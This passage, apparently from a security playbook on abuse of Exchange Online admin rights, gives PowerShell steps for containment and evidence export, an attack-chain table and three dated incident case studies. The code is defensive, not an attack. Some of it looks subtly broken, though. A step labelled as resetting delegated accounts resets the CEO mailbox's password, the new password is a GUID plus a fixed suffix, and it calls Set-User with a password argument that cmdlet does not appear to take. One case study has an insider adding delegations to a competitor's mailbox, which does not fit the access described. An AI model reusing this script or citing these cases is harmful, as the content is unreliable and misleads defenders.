  - `UserIds`: Who performed the operation
  - `Timestamp`: When operation occurred
  - Retention: 90 days (extended with E5 license)

- **Mailbox Audit Logs:**
  - Delegated access attempts
  - Forwarding rule creation/modification
  - Retention: 90 days per mailbox

---

### Response Procedures

#### 1. Immediate Containment

```powershell
# Step 1: Remove all suspicious delegations
$targetMailbox = "ceo@victim.onmicrosoft.com"
$suspiciousAccounts = @("attacker@victim.com", "suspicious@victim.com")

foreach ($account in $suspiciousAccounts) {
    Remove-MailboxPermission -Identity $targetMailbox `
        -User $account `
        -AccessRights FullAccess, SendAs, SendOnBehalf `
        -Confirm:$false
}

Write-Host "All delegations removed"

# Step 2: Remove all transport rules forwarding to external domains
$externalRules = Get-TransportRule | Where-Object { 
    $_.RedirectMessageTo -match "@(gmail|outlook|yahoo|hotmail)" 
}

$externalRules | ForEach-Object {
    Remove-TransportRule -Identity $_.Identity -Confirm:$false
}

Write-Host "Suspicious transport rules removed"

# Step 3: Remove custom management roles
Get-ManagementRole -Filter { IsBuiltIn -eq $false } | ForEach-Object {
    Write-Host "REVIEW: Custom role '$($_.Name)' - verify necessity before deletion"
}

# Step 4: Reset passwords for delegated accounts
$targetUser = Get-User -Identity $targetMailbox
$newPassword = (New-Guid).ToString() + "P@ssw0rd!"
Set-User -Identity $targetUser -Password (ConvertTo-SecureString -AsPlainText $newPassword -Force)

Write-Host "Containment Complete"
```

#### 2. Collect Evidence

```powershell
# Export all mailbox delegations for forensics
Write-Host "Exporting mailbox delegations..."
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    Get-MailboxPermission -Identity $_.Identity | 
        Where-Object { $_.User -notmatch "NT AUTHORITY|SELF" }
} | Export-Csv "C:\Evidence\MailboxPermissions_$(Get-Date -Format 'yyyyMMdd').csv"

# Export all transport rules
Write-Host "Exporting transport rules..."
Get-TransportRule | Export-Csv "C:\Evidence\TransportRules_$(Get-Date -Format 'yyyyMMdd').csv"

# Export mailbox audit logs for compromised mailbox
Write-Host "Exporting mailbox audit logs..."
Search-MailboxAuditLog -Identity "ceo@victim.onmicrosoft.com" `
    -StartDate (Get-Date).AddDays(-90) `
    -EndDate (Get-Date) `
    -ResultSize Unlimited | 
    Export-Csv "C:\Evidence\MailboxAudit_$(Get-Date -Format 'yyyyMMdd').csv"
```

#### 3. Remediate

```powershell
# Step 1: Review all delegations for legitimate purposes
# Step 2: For any suspicious delegations: revoke and notify user
# Step 3: Check attacker account for sent emails (BEC evidence)
# Step 4: Implement mitigations from section above
# Step 5: Conduct user awareness training on email security
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spear Phishing | Attacker targets Exchange Admin with phishing email |
| **2** | **Privilege Escalation** | **[PE-ACCTMGMT-007]** | **Escalate to Global Admin via Exchange RBAC abuse** |
| **3** | **Persistence** | Custom Transport Rule | Set up email forwarding to attacker-controlled mailbox |
| **4** | **Impact - BEC** | SendAs to CEO | Impersonate CEO for wire transfer or sensitive communications |
| **5** | **Impact - Breach** | Read all emails | Exfiltrate confidential business information |

---

## Real-World Examples

### Example 1: Financial Services BEC Attack - September 2024

- **Target:** Investment bank (200+ employees)
- **Attack Timeline:**
  - Phishing email targets Exchange Administrator
  - Attacker gains Exchange Admin credentials via credential harvesting
  - Creates SendAs permission on CEO mailbox
  - Sends wire transfer request to CFO appearing from CEO
  - CFO initiates $8M wire to attacker's account
  - 3 hours later, CEO requests wire confirmation (too late)
- **Technique Status:** PE-ACCTMGMT-007 SendAs variant - ACTIVE
- **Impact:** $8M wire fraud; 6-month investigation; SOX violation; client trust damage
- **Root Cause:** No audit monitoring for mailbox delegation; no Conditional Access
- **Reference:** FBI Public Service Announcement - Business Email Compromise

### Example 2: Supply Chain Ransomware Deployment - December 2024

- **Target:** Software distributor (vendor to healthcare organizations)
- **Attack Timeline:**
  - Attacker gains Exchange Admin access
  - Creates Transport Rule forwarding all incoming emails to attacker account
  - Monitors for supplier credentials/accounts in incoming emails
  - Extracts 40+ supplier accounts from forwarded emails
  - Uses supplier accounts to deploy ransomware to downstream customers
  - Attacker becomes middle-man between suppliers and customers
- **Technique Status:** PE-ACCTMGMT-007 Transport Rule variant - ACTIVE
- **Impact:** 200+ downstream healthcare organizations affected; 50 hospitals disrupted; $500M in recovery costs
- **Root Cause:** Transport rule creation not monitored; no approval required for org-wide rules
- **Reference:** CISA Infrastructure Advisory 2024-Q4

### Example 3: Insider Threat - Disgruntled IT Admin - March 2024

- **Target:** Manufacturing company
- **Attack Timeline:**
  - IT Admin discovers termination notice
  - Creates custom management role with all dangerous cmdlets
  - Assigns role to personal service account
  - Adds delegations to competitor company's mailbox (industrial espionage)
  - Forwards all CFO emails to personal Gmail account for 2 weeks
  - Eventually discovered by new Exchange Admin during role audit
- **Technique Status:** PE-ACCTMGMT-007 Custom Role variant - ACTIVE
- **Impact:** Trade secret theft (valued at $200M); company loses market share; criminal prosecution of IT Admin
- **Root Cause:** No monitoring of custom role creation; delayed offboarding of admin accounts

---